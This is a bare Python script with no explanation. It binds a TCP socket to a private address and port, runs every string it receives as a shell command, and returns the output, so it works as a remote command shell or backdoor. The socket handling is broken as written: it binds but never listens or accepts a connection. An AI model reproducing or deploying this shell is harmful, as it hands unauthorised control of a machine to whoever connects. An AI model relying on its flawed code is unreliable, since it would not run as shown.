import socket
import os
import sys, subprocess
host="192.168.4.4"
port=65532
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind((host,port))
while True:
	command=s.recv(1024)
	if command==b'exit':
		print("Connection is closed!!!")
		s.close()
		break
	else:
		proc=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,\
			stderr=subprocess.PIPE,stdin=subprocess.PIPE)
		out=proc.stdout.read()+proc.stderr.read()
		s.send(out)
